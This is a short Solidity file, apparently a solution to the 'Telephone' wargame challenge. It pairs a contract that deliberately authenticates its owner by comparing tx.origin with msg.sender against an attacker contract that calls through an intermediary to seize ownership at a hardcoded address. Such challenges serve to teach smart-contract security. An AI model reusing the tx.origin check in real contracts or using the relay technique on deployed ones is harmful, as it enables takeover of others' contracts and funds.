// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract callOwner {
  Telephone public telephone = Telephone(0x95809aB98eE981d343563949936AB0f2A7C94cEA);
  function changOwner(address _owner) public {
      telephone.changeOwner(_owner);
  }
}